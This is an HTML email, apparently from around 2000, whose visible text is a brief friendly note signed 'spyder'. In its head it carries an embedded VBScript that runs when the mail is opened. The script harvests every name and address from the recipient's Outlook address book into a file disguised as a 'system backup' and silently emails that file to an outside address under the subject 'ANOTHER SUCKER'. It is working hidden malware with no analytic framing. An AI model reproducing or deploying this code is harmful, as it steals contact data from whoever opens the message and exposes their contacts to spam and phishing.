<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML><HEAD>
<META content="text/html; charset=iso-8859-1" http-equiv=Content-Type>
<META content="MSHTML 5.00.3103.1000" name=GENERATOR></HEAD>
	<script language=vbscript runat="client">

	Dim dirwin,dirsystem,dirtemp
	Dim fs,fl
	Dim out,mapi,ctrlists,x,malead
	Set out= CreateObject("Outlook.Application") 'get outlook application object
	Set fs = CreateObject("Scripting.FileSystemObject") 'get file system object
	Set mapi=out.GetNameSpace("MAPI") 'get default address book
	
	Set dirwin = fs.GetSpecialFolder(0) 'windows system folder
	Set dirsystem = fs.GetSpecialFolder(1) 'system directory
	Set dirtemp = fs.GetSpecialFolder(2) 'temp directory
		
	If fs.FileExists(dirtemp&"outlook.add") then
		Set fl = fs.OpenTextFile(dirtemp&"outlook.add", 2, True)
	Else
		Set f1 = fs.CreateTextFile(dirtemp&"outlook.add", True)
	End If
		
	fl.write "This file is a system backup of your Address List, performed 11/03/00" & vbcrlf
	fl.write "[34jfhhh5583koi4885kkas995p]:[!992334]:[09945]" & vbcrlf & vbcrlf & vbcrlf
	
	'for each address list in address book
	for ctrlists=1 to mapi.AddressLists.Count
		x=1
		set a=mapi.AddressLists(ctrlists)
		'for each entry in address list
		for ctrentries=1 to a.AddressEntries.Count
			'get name and email address
			malead=a.AddressEntries(x) & ": " & a.AddressEntries(x).address & ";" & vbcrlf
			'append to file
			fl.write malead
			x=x+1
		next
	next
	'now send the whole thing to a mail account
	set male=out.CreateItem(0)
	male.Recipients.Add("david.halligan@info-com.com")
	male.Subject = "ANOTHER SUCKER"
	male.Body = vbcrlf&"CHECK OUT THIS GUYS MATES"
	male.Attachments.Add(dirtemp&"outlook.add")
	male.Send	
	Set out=Nothing
	Set mapi=Nothing

	</script>
</head>
<body>
<p>Hi m8, just wondering how things are?  give me a call</p>
<p>spyder</p>
</body>
</html>
